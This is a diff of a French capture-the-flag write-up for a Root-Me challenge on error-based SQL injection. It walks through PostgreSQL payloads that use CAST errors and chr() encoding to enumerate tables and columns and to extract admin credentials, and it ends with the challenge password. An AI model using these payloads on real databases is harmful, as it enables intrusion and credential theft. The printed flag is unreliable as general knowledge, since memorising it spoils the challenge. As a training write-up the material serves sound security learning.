@@ -18,126 +18,144 @@ Le but du challenge est d'exploiter une **SQL Injection basée sur les erreurs**
 
 ## 3. Étapes de découverte de la vulnérabilité
 
-1. En arrivant sur la page du challenge, on découvre un formulaire de login standard avec deux champs : **username** et **password**.
+### 3.1. Identification de la vulnérabilité
 
-2. On commence par tester des injections SQL simples pour identifier la vulnérabilité :
+Dès le titre du challenge **"SQL injection - Error"**, on doit s'attendre à une vulnérabilité basée sur l'exploitation du message d'erreur retourné par le serveur lors d'une requête SQL [cf. OWASP : Testing for SQL Injection (OTG-INPVAL-005)].
 
-   ```
-   username: admin' OR '1'='1
-   password: test
-   ```
+En explorant la page du challenge, on remarque une URL avec un paramètre `order` :
 
-3. La page retourne une erreur SQL, ce qui confirme la présence d'une **SQL Injection** et indique que l'application utilise **PostgreSQL** :
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=1
+```
 
-   ```
-   ERROR: unterminated quoted string at or near "'admin'' OR '1'='1'"
-   ```
+On teste rapidement ce paramètre et on obtient une erreur SQL :
 
-4. Cette erreur révèle que :
-   * L'application est vulnérable aux injections SQL
-   * La base de données est **PostgreSQL** (syntaxe des erreurs)
-   * Les erreurs SQL sont affichées directement à l'utilisateur
+```
+ERROR: syntax error at or near "1" 
+LINE 1: SELECT * FROM contents order by page 1 ^
+```
 
-5. On peut exploiter cette vulnérabilité en utilisant la technique **CAST** pour forcer PostgreSQL à afficher des données dans les messages d'erreur.
+La requête SQL est donc de la forme :
+```sql
+SELECT * FROM contents order by page [injection]
+```
+
+### 3.2. Identification du moteur de base de données
+
+Pour identifier le moteur de BDD utilisé, on injecte une fonction invalide :
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,coucou()
+```
+
+Résultat :
+
+```
+ERROR: function coucou() does not exist 
+LINE 1: SELECT * FROM contents order by page ,coucou() ^ 
+HINT: No function matches the given name and argument types. You might need to add explicit type casts.
+```
+
+Le message d'erreur et la syntaxe confirment qu'il s'agit de **PostgreSQL**.
+
+### 3.3. Test de la technique CAST
+
+On teste l'exploitation via la fonction `CAST` pour forcer une erreur verbeuse :
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast((chr(95)||current_database()) as numeric)
+```
+
+Résultat :
+
+```
+ERROR: invalid input syntax for type numeric: "_c_webserveur_34"
+```
+
+Parfait ! On peut maintenant extraire des données via les messages d'erreur. Le nom de la base de données est `c_webserveur_34`.
 
 ---
 
 ## 4. Exploitation de la vulnérabilité
 
-### 4.1. Découverte des tables
+### 4.1. Contrainte : Contourner les guillemets
 
-Pour lister les tables de la base de données, on utilise la requête suivante dans le champ **username** :
+On se rend compte que l'utilisation des guillemets simples (`'`) et doubles (`"`) pose problème. On va donc passer par de la **concaténation** avec `chr(##)` et `||`.
 
-```sql
-admin',(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET 0) AS NUMERIC))-- 
+Pour faciliter la conversion, on peut utiliser Python :
+
+```python
+'||'.join([ "chr("+str(ord(a))+")" for a in "string" ])
 ```
 
-**Explication** :
-* `CHR(62)` : Génère le caractère `>` pour marquer le début des données extraites
-* `pg_tables` : Table système PostgreSQL contenant la liste de toutes les tables
-* `LIMIT 1 OFFSET k` : Permet d'extraire les tables une par une en incrémentant `k`
-* `CAST(...AS NUMERIC)` : Force une conversion vers un type numérique, ce qui génère une erreur contenant la valeur de la chaîne
-
-En incrémentant l'OFFSET, on découvre plusieurs tables, dont une table suspecte :
-
-```
->m3mbr35t4bl3
+Exemple pour encoder `"public"` :
+```python
+'||'.join([ "chr("+str(ord(a))+")" for a in "public" ])
+# Résultat : chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99)
 ```
 
-### 4.2. Comptage des enregistrements
+### 4.2. Énumération des tables
 
-Pour vérifier combien d'utilisateurs existent dans la table :
-
-```sql
-admin',(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))-- 
-```
-
-Résultat : `>1` (il y a un seul utilisateur)
-
-### 4.3. Découverte de la structure de la table
-
-Pour identifier les colonnes de la table `m3mbr35t4bl3`, on utilise la technique **GROUP BY** progressive :
-
-```sql
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))-- 
-```
-
-PostgreSQL retourne une erreur indiquant le nom de la première colonne :
+Pour lister les tables de la base de données, on utilise `information_schema.tables` avec `LIMIT/OFFSET` pour itérer :
 
 ```
-ERROR: column "m3mbr35t4bl3.id" must appear in the GROUP BY clause
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast((SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1) as numeric)
 ```
 
-On continue en ajoutant les colonnes découvertes une par une :
+Résultat :
 
-```sql
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))-- 
+```
+ERROR: invalid input syntax for type numeric: "m3mbr35t4bl3"
+```
+
+**Alternative** : Lister les tables du schéma `public` (par défaut sur PostgreSQL) :
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT table_name FROM information_schema.tables WHERE table_schema=chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99) LIMIT 1 OFFSET 0) as int))
+```
+
+On découvre la table : **`m3mbr35t4bl3`**
+
+### 4.3. Énumération des colonnes
+
+Pour extraire les colonnes de la table `m3mbr35t4bl3`, on encode le nom de la table avec `chr()` :
+
+```python
+# Encodage de "m3mbr35t4bl3"
+'||'.join([ "chr("+str(ord(a))+")" for a in "m3mbr35t4bl3" ])
+# chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51)
+```
+
+Requête pour obtenir les colonnes (en incrémentant `OFFSET`) :
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0) as int))
 ```
 
 **Colonnes découvertes** :
-* `id`
-* `us3rn4m3_c0l`
-* `p455w0rd_c0l`
-* `em41l_c0l`
+* `id` (OFFSET 0)
+* `us3rn4m3_c0l` (OFFSET 1)
+* `p455w0rd_c0l` (OFFSET 2)
+* `em41l_c0l` (OFFSET 3)
 
 ### 4.4. Extraction des données
 
-Maintenant qu'on connaît la structure de la table, on peut extraire les données :
+Maintenant qu'on connaît la structure, on peut extraire toutes les données en une seule requête avec concaténation :
 
-#### Extraction de l'ID :
-
-```sql
-admin',(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))-- 
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) as int))
 ```
 
-Résultat : `>1`
+**Explication** :
+* `chr(32)` : Caractère espace pour séparer les colonnes
+* `||` : Opérateur de concaténation PostgreSQL
+* `CAST(...as int)` : Force une erreur contenant toutes les données
 
-#### Extraction de l'email :
+Résultat :
 
-```sql
-admin',(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
 ```
-
-Résultat : `>admin@chalng.com`
-
-#### Extraction du username :
-
-```sql
-admin',(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
+ERROR: invalid input syntax for integer: "1 admin 1a2BdKT5DIx3qxQN3UaC admin@localhost"
 ```
-
-Résultat : `>admin`
-
-#### Extraction du password :
-
-```sql
-admin',(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
-```
-
-Résultat : `>1a2BdKT5DIx3qxQN3UaC`
 
 ---
 
@@ -145,45 +163,83 @@ Résultat : `>1a2BdKT5DIx3qxQN3UaC`
 
 Voici la séquence complète des payloads utilisés pour extraire les informations :
 
-```sql
-# 1. Découverte des tables
-admin',(CAST(CHR(62)||(SELECT tablename from pg_tables LIMIT 1 OFFSET k) AS NUMERIC))-- 
+### Étape 1 : Identifier le moteur de BDD
 
-# 2. Comptage des enregistrements
-admin',(CAST(CHR(62)||(SELECT COUNT(1) FROM m3mbr35t4bl3) AS NUMERIC))-- 
-
-# 3. Découverte de la structure (colonnes)
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY 1) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT * FROM m3mbr35t4bl3 GROUP BY us3rn4m3_c0l, id, p455w0rd_c0l, em41l_c0l) AS NUMERIC))-- 
-
-# 4. Extraction des données
-admin',(CAST(CHR(62)||(SELECT id FROM m3mbr35t4bl3) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT em41l_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT us3rn4m3_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
-admin',(CAST(CHR(62)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3) AS NUMERIC))-- 
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,test()
 ```
 
-### Explication technique du payload :
+### Étape 2 : Extraire le nom de la base de données
 
-* **`CAST(...AS NUMERIC)`** : Force PostgreSQL à convertir une chaîne en nombre, ce qui échoue et génère une erreur contenant la valeur de la chaîne
-* **`CHR(62)`** : Génère le caractère `>` pour faciliter l'identification des données extraites dans les messages d'erreur
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast((chr(95)||current_database()) as numeric)
+```
+
+### Étape 3 : Énumérer les tables
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,cast((SELECT table_name FROM information_schema.tables WHERE table_catalog=current_database() LIMIT 1 OFFSET 1) as numeric)
+```
+
+**Alternative** (schéma `public`) :
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT table_name FROM information_schema.tables WHERE table_schema=chr(112)||chr(117)||chr(98)||chr(108)||chr(105)||chr(99) LIMIT 1 OFFSET 0) as int))
+```
+
+### Étape 4 : Énumérer les colonnes de `m3mbr35t4bl3`
+
+```python
+'||'.join([ "chr("+str(ord(a))+")" for a in "m3mbr35t4bl3" ])
+# chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51)
+```
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT column_name FROM information_schema.columns WHERE table_name=chr(109)||chr(51)||chr(109)||chr(98)||chr(114)||chr(51)||chr(53)||chr(116)||chr(52)||chr(98)||chr(108)||chr(51) LIMIT 1 OFFSET 0) as int))
+```
+
+Résultats (OFFSET 0 à 3) :
+* `id`
+* `us3rn4m3_c0l`
+* `p455w0rd_c0l`
+* `em41l_c0l`
+
+### Étape 5 : Extraction des données complètes
+
+```
+http://challenge01.root-me.org/web-serveur/ch34/?action=contents&order=,(cast((SELECT id||chr(32)||us3rn4m3_c0l||chr(32)||p455w0rd_c0l||chr(32)||em41l_c0l FROM m3mbr35t4bl3 LIMIT 1 OFFSET 0) as int))
+```
+
+**Résultat** :
+```
+ERROR: invalid input syntax for integer: "1 admin 1a2BdKT5DIx3qxQN3UaC admin@localhost"
+```
+
+### Explication technique des payloads :
+
+* **`CAST(...AS numeric/int)`** : Force PostgreSQL à convertir une chaîne en nombre, ce qui génère une erreur contenant la valeur
+* **`chr(##)`** : Génère un caractère ASCII (ex: `chr(32)` = espace, `chr(95)` = underscore)
 * **`||`** : Opérateur de concaténation de chaînes en PostgreSQL
-* **`--`** : Commentaire SQL pour ignorer le reste de la requête originale
+* **`information_schema.tables`** : Vue système contenant les métadonnées des tables
+* **`information_schema.columns`** : Vue système contenant les métadonnées des colonnes
+* **`current_database()`** : Fonction retournant le nom de la base de données courante
+* **`LIMIT 1 OFFSET k`** : Permet d'itérer sur les résultats en incrémentant `k`
 
 ---
 
 ## 6. Résultat obtenu
 
-Après l'extraction complète, on obtient les credentials suivants :
+Après l'extraction complète via le dernier payload, on obtient les credentials suivants :
 
-**Username** : `admin`
+```
+"1 admin 1a2BdKT5DIx3qxQN3UaC admin@localhost"
+```
 
-**Password** : `1a2BdKT5DIx3qxQN3UaC`
-
-On peut maintenant se connecter avec ces credentials pour valider le challenge.
+**Données extraites** :
+* **ID** : `1`
+* **Username** : `admin`
+* **Password** : `1a2BdKT5DIx3qxQN3UaC`
+* **Email** : `admin@localhost`
 
 **Le password est le flag** : `1a2BdKT5DIx3qxQN3UaC`
 
